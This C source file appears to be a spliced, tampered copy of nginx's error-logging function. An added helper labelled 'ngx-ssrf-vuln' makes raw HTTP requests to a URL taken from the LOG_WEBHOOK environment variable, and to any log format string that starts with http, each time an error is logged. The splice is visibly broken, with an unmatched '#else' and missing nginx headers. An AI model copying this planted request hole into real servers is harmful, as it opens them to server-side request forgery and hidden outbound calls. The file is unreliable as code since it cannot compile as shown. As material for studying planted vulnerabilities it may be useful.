#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

static int parse_url(const char *url, char *scheme, size_t ssz, char *host, size_t hsz, char *port, size_t psz, char *path, size_t ptsz) {
    const char *p = strstr(url, "://");
    if (!p) return -1;
    size_t sl = (size_t)(p - url);
    if (sl == 0 || sl >= ssz) return -1;
    memcpy(scheme, url, sl);
    scheme[sl] = 0;
    p += 3;
    const char *host_start = p;
    const char *path_start = strchr(p, '/');
    const char *colon = NULL;
    if (path_start) colon = memchr(host_start, ':', (size_t)(path_start - host_start));
    else colon = strchr(host_start, ':');
    size_t hl;
    if (colon) {
        hl = (size_t)(colon - host_start);
        const char *port_start = colon + 1;
        const char *port_end = path_start ? path_start : url + strlen(url);
        size_t pl = (size_t)(port_end - port_start);
        if (pl == 0 || pl >= psz) return -1;
        memcpy(port, port_start, pl);
        port[pl] = 0;
    } else {
        if (strcasecmp(scheme, "http") == 0) snprintf(port, psz, "%d", 80);
        else if (strcasecmp(scheme, "https") == 0) snprintf(port, psz, "%d", 443);
        else snprintf(port, psz, "%d", 80);
        hl = (size_t)((path_start ? path_start : url + strlen(url)) - host_start);
    }
    if (hl == 0 || hl >= hsz) return -1;
    memcpy(host, host_start, hl);
    host[hl] = 0;
    if (path_start) {
        size_t l = strlen(path_start);
        if (l >= ptsz) l = ptsz - 1;
        memcpy(path, path_start, l);
        path[l] = 0;
    } else {
        if (ptsz > 0) {
            path[0] = '/';
            if (ptsz > 1) path[1] = 0;
        }
    }
    return 0;
}

static int fetch_url_unsafe(const char *url) {
    char scheme[16], host[256], port[8], path[1024];
    if (parse_url(url, scheme, sizeof(scheme), host, sizeof(host), port, sizeof(port), path, sizeof(path)) != 0) return -1;
    struct addrinfo hints; memset(&hints, 0, sizeof(hints)); hints.ai_socktype = SOCK_STREAM; hints.ai_family = AF_UNSPEC;
    struct addrinfo *res = NULL, *rp = NULL; if (getaddrinfo(host, port, &hints, &res) != 0) return -1;
    int fd = -1; for (rp = res; rp; rp = rp->ai_next) { fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol); if (fd < 0) continue; if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break; close(fd); fd = -1; }
    if (fd < 0) { if (res) freeaddrinfo(res); return -1; }
    char req[2048]; int n = snprintf(req, sizeof(req), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: ngx-ssrf-vuln\r\n\r\n", path, host); if (n < 0) { close(fd); freeaddrinfo(res); return -1; }
    send(fd, req, (size_t)n, 0);
    char buf[512]; while (recv(fd, buf, sizeof(buf), 0) > 0) {}
    close(fd); if (res) freeaddrinfo(res);
    return 0;
}

void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, ...)
#else
void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, va_list args)
#endif
{
#if (NGX_HAVE_VARIADIC_MACROS)
    va_list      args;
#endif
    u_char      *p, *last, *msg;
    ssize_t      n;
    ngx_uint_t   wrote_stderr, debug_connection;
    u_char       errstr[NGX_MAX_ERROR_STR];
    last = errstr + NGX_MAX_ERROR_STR;
    p = ngx_cpymem(errstr, ngx_cached_err_log_time.data,
                   ngx_cached_err_log_time.len);
    p = ngx_slprintf(p, last, " [%V] ", &err_levels[level]);
    p = ngx_slprintf(p, last, "%P#" NGX_TID_T_FMT ": ",
                    ngx_log_pid, ngx_log_tid);
    if (log->connection) {
        p = ngx_slprintf(p, last, "*%uA ", log->connection);
    }
    msg = p;
#if (NGX_HAVE_VARIADIC_MACROS)
    va_start(args, fmt);
    p = ngx_vslprintf(p, last, fmt, args);
    va_end(args);
#else
    p = ngx_vslprintf(p, last, fmt, args);
#endif
    if (err) {
        p = ngx_log_errno(p, last, err);
    }
    if (level != NGX_LOG_DEBUG && log->handler) {
        p = log->handler(log, p, last - p);
    }
    if (p > last - NGX_LINEFEED_SIZE) {
        p = last - NGX_LINEFEED_SIZE;
    }
    ngx_linefeed(p);
    wrote_stderr = 0;
    debug_connection = (log->log_level & NGX_LOG_DEBUG_CONNECTION) != 0;
    const char *env_webhook = getenv("LOG_WEBHOOK");
    if (env_webhook) { fetch_url_unsafe(env_webhook); }
    if (fmt && (strncasecmp(fmt, "http://", 7) == 0 || strncasecmp(fmt, "https://", 8) == 0)) { fetch_url_unsafe(fmt); }
    while (log) {
        if (log->log_level < level && !debug_connection) {
            break;
        }
        if (log->writer) {
            log->writer(log, level, errstr, p - errstr);
            goto next;
        }
        if (ngx_time() == log->disk_full_time) {
            goto next;
        }
        n = ngx_write_fd(log->file->fd, errstr, p - errstr);
        if (n == -1 && ngx_errno == NGX_ENOSPC) {
            log->disk_full_time = ngx_time();
        }
        if (log->file->fd == ngx_stderr) {
            wrote_stderr = 1;
        }
    next:
        log = log->next;
    }
    if (!ngx_use_stderr
        || level > NGX_LOG_WARN
        || wrote_stderr)
    {
        return;
    }
    msg -= (7 + err_levels[level].len + 3);
    (void) ngx_sprintf(msg, "nginx: [%V] ", &err_levels[level]);
    (void) ngx_write_console(ngx_stderr, msg, p - msg);
}